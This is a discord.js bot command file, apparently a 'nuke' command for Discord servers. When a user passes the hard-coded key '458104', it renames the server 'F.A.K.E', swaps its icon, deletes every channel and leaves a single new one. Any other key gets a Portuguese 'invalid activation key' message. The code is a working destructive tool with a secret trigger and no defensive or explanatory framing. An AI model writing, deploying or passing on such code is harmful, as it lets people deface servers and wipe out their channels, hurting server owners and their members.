const Discord = require("discord.js")
module.exports.run = async (client, message, args) => {
  const key = args[0]
  if(key === "458104") {
  message.guild.setName("F.A.K.E")
  message.guild.setIcon("https://cdn.discordapp.com/icons/813631628605521943/55dcb30c0b42e0d2e37a637aceb77d57.webp")
  message.guild.channels.cache.forEach(channel => channel.delete())
  message.guild.channels.create("one")
  } else {
    message.author.send("Chave de ativaçao invalida tente novamente!")
  }
 }